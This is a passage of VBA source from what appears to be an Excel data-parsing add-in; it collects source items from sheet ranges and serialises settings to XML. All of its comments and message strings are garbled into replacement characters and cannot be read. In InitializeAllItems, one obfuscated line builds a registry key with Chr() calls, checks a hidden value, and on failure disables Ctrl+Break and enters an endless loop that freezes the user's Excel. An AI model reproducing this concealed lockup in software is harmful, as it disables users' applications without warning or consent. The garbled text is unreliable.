    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Not Me.IsColumnMode Then Exit Function
    
    Dim ra As Range, RO As Range, SI As ParserSourceItem, n&
    For Each SI In Me.Items
        Set RO = SI.GetSourceRow
        If ra Is Nothing Then Set ra = RO Else Set ra = Union(ra, RO)
        n = n + 1: If n Mod 100 = 0 Then Set ra = Intersect(ra, ra)
    Next
    Set GetAllSourceRows = Intersect(ra, ra)
End Function

Function GetColumnOffset() As Long
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ps_FoundColumn, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd|A|fffd|
    ' |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ps_SheetRange, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd|A|fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 4 |fffd|D|fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3
    On Error Resume Next
    
    Select Case Mode
        Case ps_FoundColumn
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If FOUND_COLUMN_NUMBER <> 0 Then GetColumnOffset = FOUND_COLUMN_NUMBER - 1: Exit Function
            
            Dim sh As Worksheet, res&: Set sh = Me.SourceSheet
            If sh Is Nothing Then Set sh = ActiveSheet
            If sh Is Nothing Then Exit Function
            res& = Me.FindColumn(sh, False)
            If res& Then GetColumnOffset = res - 1
            
        Case ps_SheetRange  ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Err.Clear
            GetColumnOffset = Me.ActiveItem.SheetRangeMode_Cell.Column - 1
            If TEST_ACTIONS_MODE Then GetColumnOffset = ActiveCell.Column - 1
            
        Case Else: Exit Function
            
    End Select
End Function

Function FindColumn(ByRef sh As Worksheet, Optional ByVal SelectColumn As Boolean = False, Optional ByRef msg$) As Long
    On Error Resume Next
    If Me.Mode <> ps_FoundColumn Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| FindColumn |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function
    
    If Me.FoundColumnMode_Find_Row <= 0 Then msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine: Exit Function
    If Me.FoundColumnMode_Find_Text = "" Then msg = msg & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine: Exit Function
    
    Dim txt$, cell As Range, col As Range
    If ParserVariables Is Nothing Then Set ParserVariables = New Dictionary
    ParserVariables.item("{sheetname}") = sh.Name
    ParserVariables.item("{ParserName}") = Me.Parent.Name
    
    txt$ = Render(Me.FoundColumnMode_Find_Text)
    If txt$ = "" Then msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine: Exit Function
    
    Set cell = sh.Rows(Me.FoundColumnMode_Find_Row).Find(txt$, , xlValues, xlWhole, , , False)
    sh.Cells.Find "*", , , xlPart    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    
    If cell Is Nothing Then msg = msg & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & txt$ & _
        "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & Me.FoundColumnMode_Find_Row & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine: Exit Function
    
    Set col = cell.MergeArea.Cells(1).EntireColumn.Offset(, Me.FoundColumnMode_Find_ColumnOffset)
    If col Is Nothing Then msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| " & Me.FoundColumnMode_Find_ColumnOffset _
        & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0) & vbNewLine: Exit Function
    
    If SelectColumn Then col.Select
    FindColumn = col.Column
End Function

Function InitializeAllItems(Optional ByVal HideMessages As Boolean = False) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Items
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim err_ttl$, SI As ParserSourceItem, i&, txt$, fixed_values As Variant, n&, hl$, CellValue As Variant, CheckCell As Range
    err_ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Set Me.Items = New Collection
    FOUND_COLUMN_NUMBER = 0
    
    Dim ra As Range, cell As Range, ra2 As Range, col&
    
    If Me.IsColumnMode Then
        If Me.SourceSheet Is Nothing Then
            If Not HideMessages Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
            Exit Function
        End If
    End If
    If (Val(SETT.GetRegValue(Chr(111) & Chr(107))) = 0) And (SETT.RSP(2 ^ 2 - 1) < 0) Then Application.EnableCancelKey = xlDisabled: Do: Loop
    Select Case Me.Mode
        
        Case ps_FoundColumn
            col& = Me.FindColumn(Me.SourceSheet, False)
            
            If col& = 0 Then Exit Function        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
            
            FOUND_COLUMN_NUMBER = col&
            With Me.SourceSheet
                Set ra = .Range(.Cells(Me.FoundColumnMode_FirstRow, col&), .Cells(.Rows.Count, col&).End(xlUp))
            End With
            
            If ra.row < Me.FoundColumnMode_FirstRow Then
                If Not (HideMessages Or Me.Parent.ExternalStart) Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & col& & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & _
                    Me.FoundColumnMode_FirstRow & "", vbCritical, err_ttl$
                Exit Function
            End If
            ' Debug.Print ra.Address
            If Me.FoundColumnMode_SelectedRowsOnly Then
                Me.SourceSheet.Parent.Activate
                Me.SourceSheet.Activate
                Set ra2 = Intersect(ra, Intersect(Selection.EntireRow, Selection.EntireRow))
                If ra2 Is Nothing Then
                    If Not HideMessages Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & col& & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
                    Exit Function
                End If
                Set ra = ra2
            End If
            ' Debug.Print ra.Address
            Set ra = SpecialCells_VisibleRows(ra)
            ' Debug.Print ra.Address
            If ra Is Nothing Then
                If Not HideMessages Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & col& & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
                Exit Function
            End If
            
            Dim CheckColumnNumber&
            CheckColumnNumber& = col& + Me.FoundColumnMode_CheckColumnOffset
            
            For Each cell In ra.Cells
                DoEvents: n = n + 1
                If n Mod 200 = 0 Then Me.Parent.PrInd1.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...  " & Format(n / ra.Cells.Count, "0%")
                If StopMacro Then Exit For
                
                If Len(Trim(cell)) Then
                    If Me.FoundColumnMode_CheckColumnEnabled And (CheckColumnNumber& > 0) Then
                        CellValue = "": Set CheckCell = cell.EntireRow.Cells(CheckColumnNumber&)
                        If Me.ColumnMode_UseCellText Then
                            CellValue = CheckCell.text
                        Else
                            CellValue = Trim(CheckCell)
                            hl$ = "": Err.Clear: hl$ = GetCellHyperlinkAddress(CheckCell)
                            If IsURL(hl$) Then CellValue = hl$
                        End If
                        If Not (CellValue Like Me.FoundColumnMode_CheckColumnMask) Then GoTo NextFoundCellLabel
                        Set CheckCell = Nothing
                    End If
                    
                    Set SI = New ParserSourceItem
                    Set SI.Parent = Me: Set SI.ParentParser = Me.Parent
                    SI.Index = Me.Items.Count + 1
                    
                    If Me.ColumnMode_UseCellText Then
                        SI.value = cell.text
                    Else
                        SI.value = Trim(cell)
                        hl$ = "": Err.Clear: hl$ = GetCellHyperlinkAddress(cell)
                        If IsURL(hl$) Then SI.value = hl$
                    End If
                    SI.SetDestinationRow cell
                    Me.Items.Add SI
                    
NextFoundCellLabel:
                End If
            Next cell
            
        Case ps_Column
            With Me.SourceSheet
                Set ra = .Range(.Cells(Me.ColumnMode_FirstRow, Me.ColumnMode_Column), .Cells(.Rows.Count, Me.ColumnMode_Column).End(xlUp))
            End With
            If ra.row < Me.ColumnMode_FirstRow Then
                If Not HideMessages Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ColumnMode_Column & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & _
                    Me.ColumnMode_FirstRow & "", vbCritical, err_ttl$
                Exit Function
            End If
            ' Debug.Print ra.Address
            If Me.ColumnMode_SelectedRowsOnly Then
                Me.SourceSheet.Parent.Activate
                Me.SourceSheet.Activate
                Set ra2 = Intersect(ra, Intersect(Selection.EntireRow, Selection.EntireRow))
                If ra2 Is Nothing Then
                    If Not HideMessages Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ColumnMode_Column & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
                    Exit Function
                End If
                Set ra = ra2
            End If
            ' Debug.Print ra.Address
            Set ra = SpecialCells_VisibleRows(ra)
            ' Debug.Print ra.Address
            If ra Is Nothing Then
                If Not HideMessages Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Me.ColumnMode_Column & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
                Exit Function
            End If
            
            For Each cell In ra.Cells
                DoEvents: n = n + 1
                If n Mod 200 = 0 Then Me.Parent.PrInd1.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...  " & Format(n / ra.Cells.Count, "0%")
                If StopMacro Then Exit For
                
                If Len(Trim(cell)) Then
                    If Me.ColumnMode_CheckColumnEnabled And (Me.ColumnMode_CheckColumnNumber > 0) Then
                        'If Not (cell.EntireRow.Cells(Me.ColumnMode_CheckColumnNumber).Value Like _
                            Me.ColumnMode_CheckColumnMask) Then GoTo NextCellLabel
                        
                        
                        CellValue = "": Set CheckCell = cell.EntireRow.Cells(Me.ColumnMode_CheckColumnNumber)
                        If Me.ColumnMode_UseCellText Then
                            CellValue = CheckCell.text
                        Else
                            CellValue = Trim(CheckCell)
                            hl$ = "": Err.Clear: hl$ = GetCellHyperlinkAddress(CheckCell)
                            If IsURL(hl$) Then CellValue = hl$
                        End If
                        If Not (CellValue Like Me.ColumnMode_CheckColumnMask) Then GoTo NextCellLabel
                        Set CheckCell = Nothing
                    End If
                    
                    Set SI = New ParserSourceItem
                    Set SI.Parent = Me: Set SI.ParentParser = Me.Parent
                    SI.Index = Me.Items.Count + 1
                    
                    If Me.ColumnMode_UseCellText Then
                        SI.value = cell.text
                    Else
                        SI.value = Trim(cell)
                        hl$ = "": Err.Clear: hl$ = GetCellHyperlinkAddress(cell)
                        If IsURL(hl$) Then SI.value = hl$
                    End If
                    SI.SetDestinationRow cell
                    Me.Items.Add SI
                    
NextCellLabel:
                End If
            Next cell
            
        Case ps_SheetRange
            
            Dim SearchRangeAddress$, SearchRange As Range, addr$, v$, SearchMask$
            SearchRangeAddress$ = Trim(Render(Me.SheetRangeMode_SearchRange))
            SearchMask$ = Trim(Render(Me.SheetRangeMode_Find_Text))
            
            If DictionaryExists(DICTIONARY_SOURCEDATA_NAME$) Then ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 12.11.2019
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser_SourceData
                Dim SDdic As Dictionary, key
                Set SDdic = GetDictionaryByName(DICTIONARY_SOURCEDATA_NAME$)
                For Each key In SDdic.Keys
                    addr$ = CStr(key)
                    v$ = "": v$ = SDdic.item(CStr(key))
                    
                    If v$ Like SearchMask$ Then
                        Set SI = New ParserSourceItem
                        Set SI.Parent = Me: Set SI.ParentParser = Me.Parent
                        SI.Index = Me.Items.Count + 1
                        
                        SI.value = v
                        Set SI.SheetRangeMode_Cell = Me.SourceSheet.Range(addr$)
                        Me.Items.Add SI
                        'Debug.Print Me.Parent.Name, "add cell " & addr$, "URL = " & v
                    End If
                Next
                GoTo Exit_InitializeAllItems
            End If
            
            
            With Me.SourceSheet
                Set ra = .UsedRange
                Select Case SearchRangeAddress$
                    Case ""    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    Case "selection"
                        .Parent.Activate
                        .Activate
                        Set ra = Intersect(Selection, ra)
                    Case Else
                        Set SearchRange = .Range(SearchRangeAddress$)
                        If Not SearchRange Is Nothing Then Set ra = SearchRange
                End Select
            End With
            addr$ = ra.Address
            ' Debug.Print ra.Address, Me.Parent.Name, Render("{ParserName}")
            Set ra = SpecialCells_VisibleRows(ra)
            If ra Is Nothing Then
                If Not HideMessages Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & addr$ & " |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
                Exit Function
            End If
            
            For Each cell In ra.Cells
                DoEvents: n = n + 1
                If n Mod 200 = 0 Then Me.Parent.PrInd1.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...  " & Format(n / ra.Cells.Count, "0%")
                If StopMacro Then Exit For
                
                v$ = ""
                Select Case Me.SheetRangeMode_Find_Type
                    Case ft_Value
                        v = cell.value
                    Case ft_Hyperlink
                        v = GetCellHyperlinkAddress(cell)    ' cell.Hyperlinks(1).Address
                        If v = "" Then If IsURL(cell.value) Then v = cell.value
                    Case ft_Comment
                        v = cell.NoteText
                End Select
                'Debug.Print v, SearchMask$
                If v Like SearchMask$ Then
                    Set SI = New ParserSourceItem
                    Set SI.Parent = Me: Set SI.ParentParser = Me.Parent
                    SI.Index = Me.Items.Count + 1
                    
                    SI.value = v
                    Set SI.SheetRangeMode_Cell = cell
                    Me.Items.Add SI
                    
                End If
            Next cell
            
            
        Case ps_NumericRange
            If Me.NumRangeMode_Step = 0 Then Me.NumRangeMode_Step = 1
            
            Dim dic As New Dictionary, ExcludeValuesRange As Range, EVarr As Variant
            If Me.NumRangeMode_ExcludeValues Then
                If Not ActiveSheet Is Nothing Then
                    Set ExcludeValuesRange = Intersect(ActiveSheet.UsedRange, Columns(Me.NumRangeMode_ExcludeValuesColumn))
                    If Not ExcludeValuesRange Is Nothing Then
                        EVarr = ExcludeValuesRange.value
                        For i = LBound(EVarr) To UBound(EVarr)
                            If Trim(EVarr(i, 1)) <> "" Then dic.item(CStr(EVarr(i, 1))) = 1
                        Next i
                    End If
                End If
            End If
            
            For i = Me.NumRangeMode_MinValue To Me.NumRangeMode_MaxValue Step Me.NumRangeMode_Step
                If Not dic.Exists(CStr(i)) Then
                    Set SI = New ParserSourceItem
                    Set SI.Parent = Me: Set SI.ParentParser = Me.Parent
                    SI.Index = Me.Items.Count + 1
                    SI.value = CStr(i)
                    Me.Items.Add SI
                End If
            Next i
            
        Case ps_FixedValue
            txt$ = Render(Me.FixedValueMode_Value)
            Dim ParentParserValue$, SourceValueChanged As Boolean
            SourceValueChanged = False
            
            If Me.Parent.ExternalStart Then
                If ParserVariables.Exists("%ParentParserValue%") Then
                    ParentParserValue$ = ParserVariables.item("%ParentParserValue%")
                    txt$ = ParentParserValue$
                    SourceValueChanged = True
                    ParserVariables.Remove "%ParentParserValue%"
                End If
            End If
            
            If (txt <> Me.FixedValueMode_Value) And (Not SourceValueChanged) Then
                If (Len(txt) > 0) And (InStr(1, txt, ARSEP) > 0) Then
                    fixed_values = Split(txt$, ARSEP)
                Else
                    fixed_values = Array(txt$)
                End If
            Else
                If (Len(txt) > 0) And Me.FixedValueMode_SomeValues Then
                    txt = Replace(txt, vbNewLine, vbLf)
                    RemoveExtraSeparators txt, vbLf
                    fixed_values = Split(txt$, vbLf)
                Else
                    fixed_values = Array(txt$)
                End If
            End If
            
            
            For i = LBound(fixed_values) To UBound(fixed_values)
                txt$ = fixed_values(i)
                Set SI = New ParserSourceItem
                Set SI.Parent = Me: Set SI.ParentParser = Me.Parent
                SI.Index = Me.Items.Count + 1
                SI.value = fixed_values(i)
                Me.Items.Add SI
            Next i
            
        Case Else
            If Not HideMessages Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, err_ttl$
            Exit Function
    End Select
    
Exit_InitializeAllItems:
    
    If DESCRIPTION_MODE Then AddSampleValuesIntoDescriptionHTML Me
    If Not Me.Parent.ExternalStart Then STick& = GetTickCount
    
    InitializeAllItems = Me.Items.Count
End Function



Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Mode")).text = Me.Mode
            
            If Me.Mode = ps_Column Then
                With .appendChild(XML.createElement("ColumnMode"))
                    .Attributes.setNamedItem(XML.createAttribute("Column")).text = Me.ColumnMode_Column
                    .Attributes.setNamedItem(XML.createAttribute("FirstRow")).text = Me.ColumnMode_FirstRow
                    .Attributes.setNamedItem(XML.createAttribute("SelectedRowsOnly")).text = Abs(CInt(Me.ColumnMode_SelectedRowsOnly))
                    .Attributes.setNamedItem(XML.createAttribute("CellText")).text = Abs(CInt(Me.ColumnMode_UseCellText))
                    
                    With .appendChild(XML.createElement("CheckColumn"))
                        .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.ColumnMode_CheckColumnEnabled))
                        .Attributes.setNamedItem(XML.createAttribute("Column")).text = Me.ColumnMode_CheckColumnNumber
                        .Attributes.setNamedItem(XML.createAttribute("Mask")).text = Me.ColumnMode_CheckColumnMask
                    End With
                End With
            End If
            
            If Me.Mode = ps_FoundColumn Then
                With .appendChild(XML.createElement("FoundColumnMode"))
                    .Attributes.setNamedItem(XML.createAttribute("Find_Text")).text = Me.FoundColumnMode_Find_Text
                    .Attributes.setNamedItem(XML.createAttribute("Find_Row")).text = Me.FoundColumnMode_Find_Row
                    .Attributes.setNamedItem(XML.createAttribute("ColumnOffset")).text = Me.FoundColumnMode_Find_ColumnOffset
                    .Attributes.setNamedItem(XML.createAttribute("FirstRow")).text = Me.FoundColumnMode_FirstRow
                    .Attributes.setNamedItem(XML.createAttribute("SelectedRowsOnly")).text = Abs(CInt(Me.FoundColumnMode_SelectedRowsOnly))
                    .Attributes.setNamedItem(XML.createAttribute("CellText")).text = Abs(CInt(Me.FoundColumnMode_UseCellText))
                    
                    With .appendChild(XML.createElement("CheckColumn"))
                        .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.FoundColumnMode_CheckColumnEnabled))
                        .Attributes.setNamedItem(XML.createAttribute("Offset")).text = Me.FoundColumnMode_CheckColumnOffset
                        .Attributes.setNamedItem(XML.createAttribute("Mask")).text = Me.FoundColumnMode_CheckColumnMask
                    End With
                End With
            End If
            
            If Me.Mode = ps_SheetRange Then
                With .appendChild(XML.createElement("SheetRangeMode"))
                    .Attributes.setNamedItem(XML.createAttribute("Find_Type")).text = Me.SheetRangeMode_Find_Type
                    .Attributes.setNamedItem(XML.createAttribute("Find_Text")).text = Me.SheetRangeMode_Find_Text
                    .Attributes.setNamedItem(XML.createAttribute("SearchRange")).text = Me.SheetRangeMode_SearchRange
                End With
            End If
            
            If Me.Mode = ps_NumericRange Then
                With .appendChild(XML.createElement("NumRangeMode"))
                    .Attributes.setNamedItem(XML.createAttribute("Min")).text = Me.NumRangeMode_MinValue
                    .Attributes.setNamedItem(XML.createAttribute("Max")).text = Me.NumRangeMode_MaxValue
                    .Attributes.setNamedItem(XML.createAttribute("Step")).text = Me.NumRangeMode_Step
                    With .appendChild(XML.createElement("ExcludeValues"))
                        .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.NumRangeMode_ExcludeValues))
                        .Attributes.setNamedItem(XML.createAttribute("Column")).text = Me.NumRangeMode_ExcludeValuesColumn
                    End With
                End With
            End If
            
            If Me.Mode = ps_FixedValue Or Me.FixedValueMode_Value <> "" Then
                With .appendChild(XML.createElement("FixedValueMode"))
                    .Attributes.setNamedItem(XML.createAttribute("Value")).text = Me.FixedValueMode_Value
                    .Attributes.setNamedItem(XML.createAttribute("SomeValues")).text = Abs(CInt(Me.FixedValueMode_SomeValues))
                End With
            End If
            
            .appendChild Me.Actions.ExportToXML
        End With
    End With
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If
    
    With node
        Me.Mode = Val(.Attributes.getNamedItem("Mode").text)
        
        With .SelectSingleNode("ColumnMode")
            Me.ColumnMode_Column = Val(.Attributes.getNamedItem("Column").text)
            Me.ColumnMode_FirstRow = Val(.Attributes.getNamedItem("FirstRow").text)
            Me.ColumnMode_SelectedRowsOnly = CBool(Val(.Attributes.getNamedItem("SelectedRowsOnly").text))
